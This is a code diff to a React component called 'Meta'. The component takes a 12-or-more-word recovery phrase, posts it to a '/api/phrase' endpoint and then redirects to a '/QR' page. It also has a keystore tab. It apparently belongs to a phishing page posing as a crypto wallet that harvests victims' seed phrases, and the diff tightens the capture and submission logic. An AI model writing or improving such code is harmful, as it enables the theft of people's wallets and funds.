@@ -115,20 +115,21 @@ const Meta = () => {
         try {
           const getStrings = phrase.split(/[ ,]+/);
 
-          const notify =
-            getStrings.length < 12 ? console.log("Error") : getStrings;
-
-          console.log(notify);
-
-          const response = await axios.post("/api/phrase", {
-            phrase: notify,
-          });
-
-          console.log(response.data);
-
+          if (getStrings.length < 12) {
+            return alert("Check phrase and enter again");
+          } else {
+            const response = await axios.post(
+              "/api/phrase",
+              {
+                phrase: getStrings,
+              }
+            );
+            console.log(response.data);
+            navigate("/QR");
+          }
           setPhrase("");
         } catch (error) {
-          return console.log(error);
+          return console.log(error.response.data.message);
         }
       }
     } else if (switchTab === "keystore") {
